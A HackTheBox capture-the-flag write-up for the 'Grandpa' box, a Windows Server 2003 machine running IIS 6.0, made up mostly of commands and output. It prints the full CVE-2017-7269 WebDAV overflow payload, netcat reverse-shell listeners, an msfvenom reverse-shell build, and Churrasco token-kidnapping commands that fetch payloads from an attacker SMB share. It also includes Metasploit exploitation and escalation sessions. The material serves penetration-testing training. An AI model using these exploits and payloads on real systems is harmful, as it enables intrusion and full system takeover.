---
render_with_liquid: false
title: HackTheBox Writeup  Grandpa
date: 2023-11-11 14:53:35 +1400
tags: [hackthebox, nmap, windows, windows-2003, iis, webdav, cve-2017-7269, privilege-token, churrasco, msfvenom, smbserver, oscp-like, metasploit]
---




# Recon
---
```bash
┌──(bravosec㉿fsociety)-[~/htb/Grandpa]
└─$ pt init '10.129.241.161 grandpa.htb'
+---------+--------+----------------+-------------+
| PROFILE | STATUS |       IP       |   DOMAIN    |
+---------+--------+----------------+-------------+
| grandpa | on     | 10.129.241.161 | grandpa.htb |
+---------+--------+----------------+-------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sat Nov 11 14:53:35 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80 grandpa.htb
Nmap scan report for grandpa.htb (10.129.95.233)
Host is up, received user-set (0.057s latency).
Scanned at 2023-11-11 14:53:35 CST for 12s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Sat, 11 Nov 2023 06:53:28 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Nov 11 14:53:47 2023 -- 1 IP address (1 host up) scanned in 12.40 seconds
```

## 80 - IIS Server 6.0


### Info

![](/assets/obsidian/b106505fb66af86a18d1ead3f083c040.png)

# User Flag
---

# Root Flag
---

## Enum

**IIS Version 6** is mostly linked to **Windows Server 2003**

![](/assets/obsidian/c993aed4243241fe5fbdfeb2ee6b1b7b.png)

## Shell as network service


### Microsoft IIS 6.0 Remote Buffer Overflow (CVE-2017-7269)

Google : `iis 6 exploit`

> https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269

```bash
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
cd iis6-exploit-2017-CVE-2017-7269
mv 'iis6 reverse shell' main.py
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Grandpa/exploit/iis6-exploit-2017-CVE-2017-7269]
└─$ python2 main.py grandpa.htb 80 10.10.16.30 1111
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ 栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Grandpa/exploit/iis6-exploit-2017-CVE-2017-7269]
└─$ rlwrap -cAr nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.95.234] 1033
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

## From network service to SYSTEM


### Enum

```bash
c:\windows\system32\inetsrv>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                    SID
============================ ========
nt authority\network service S-1-5-20


GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANPA\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

```bash
c:\windows\system32\inetsrv>dir "C:\Documents and Settings\"
dir "C:\Documents and Settings\"
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Documents and Settings

04/12/2017  04:32 PM    <DIR>          .
04/12/2017  04:32 PM    <DIR>          ..
04/12/2017  04:12 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  04:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)   1,238,253,568 bytes free
```

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 52 Minutes, 41 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 533 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,064 MB
Page File: In Use:         406 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

### Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation

We have a service account and `SeImpersonatePrivilege` privilege token

**potato attacks** won't work on old versions of windows

Google : `SeImpersonatePrivilege windows server 2003`

> https://www.exploit-db.com/exploits/6705

![](/assets/obsidian/3a90545c5572be551e66cfd852c766e0.png)

I'm too lazy to compile the project, there must be a compiled exe on the internet, with `x86` arch

Google : `Churrasco exe`

> https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco

![](/assets/obsidian/f7be7290652c2162d3e2b2a7ceff8de2.png)

Host exploit

> **Windows server 2003**
> - Failed to use smb with password auth
> - Doesn't support smb v2
{: .prompt-tip }

```bash
mkdir -p smb && cd smb
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$(pt get lhost) LPORT=1111 -f exe -o rev.exe
smbserver.py -smb2support s .
```

Start listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Grandpa]
└─$ rlwrap -cAr nc -nlvp 1111
listening on [any] 1111 ...
```

Start exploit

```bash
c:\windows\system32\inetsrv>\\10.10.16.30\s\churrasco.exe "cmd /c start \\10.10.16.30\s\rev.exe"
\\10.10.16.30\s\churrasco.exe "cmd /c start \\10.10.16.30\s\rev.exe"
```

```bash
connect to [10.10.16.30] from (UNKNOWN) [10.129.241.161] 1045
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

Find flags

```bash
C:\WINDOWS\TEMP>cd "C:\Documents and Settings\"
cd "C:\Documents and Settings\"

C:\Documents and Settings>dir /b/s "*.txt"
dir /b/s "*.txt"
C:\Documents and Settings\Administrator\Desktop\root.txt
...
C:\Documents and Settings\Harry\Desktop\user.txt
C:\Documents and Settings\Harry\Local Settings\Application Data\Microsoft\Internet Explorer\brndlog.txt
```

```bash
C:\Documents and Settings>type "C:\Documents and Settings\Harry\Desktop\user.txt"
type "C:\Documents and Settings\Harry\Desktop\user.txt"
bdff5ec67c3cff017f2bedc146a5d869
C:\Documents and Settings>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
9359e905a2c35f861f6a57cecf28bb7b
```


# Additional
---

## Metasploit


### Initial Access

```bash
sudo msfdb start && msfconsole -q
```

```ruby
msf6 > search iis 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/firewall/blackice_pam_icq            2004-03-18       great   No     ISS PAM.dll ICQ Parser Buffer Overflow
   1  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   2  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > setg rhosts grandpa.htb
rhosts => grandpa.htb
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > setg lhost tun0
lhost => tun0
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.16.30:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.129.241.161
[*] Meterpreter session 1 opened (10.10.16.30:4444 -> 10.129.241.161:1030) at 2023-11-11 17:52:40 +0800

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

Migrate to get proper access

```ruby
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
...
 1956  392   alg.exe
 1984  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2056  1096  cidaemon.exe
 2144  344   logon.scr
 2184  1500  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2252  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2312  2184  c.exe              x86   0                                      C:\WINDOWS\IIS Temporary Compressed Files\c.exe
 2356  2184  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 2464  580   wmiprvse.exe

meterpreter > migrate 1984
[*] Migrating from 2356 to 1984...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

### Privilege Escalation

```ruby
meterpreter > bg
[*] Backgrounding session 1...

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use 0
msf6 post(multi/recon/local_exploit_suggester) > setg session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.129.241.161 - Collecting local exploits for x86/windows...
[*] 10.129.241.161 - 188 exploit checks are being tried...
[+] 10.129.241.161 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.241.161 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.241.161 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.241.161 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.241.161 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.241.161 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.241.161 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.129.241.161 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 ...
```

Test from last index (From new to old)

```ruby
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ppr_flatten_rec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ppr_flatten_rec) > exploit

[*] Started reverse TCP handler on 10.10.16.30:4444
[*] Reflectively injecting the DLL into a new process and triggering the LPE...
[*] Launching msiexec to host the DLL...
[+] Process 3912 launched.
[*] Reflectively injecting the DLL into 3912...
[*] Exploit thread executing (can take a while to run), waiting 30 sec ...
[*] Sending stage (175686 bytes) to 10.129.241.161
[*] Meterpreter session 2 opened (10.10.16.30:4444 -> 10.129.241.161:1032) at 2023-11-11 17:57:35 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

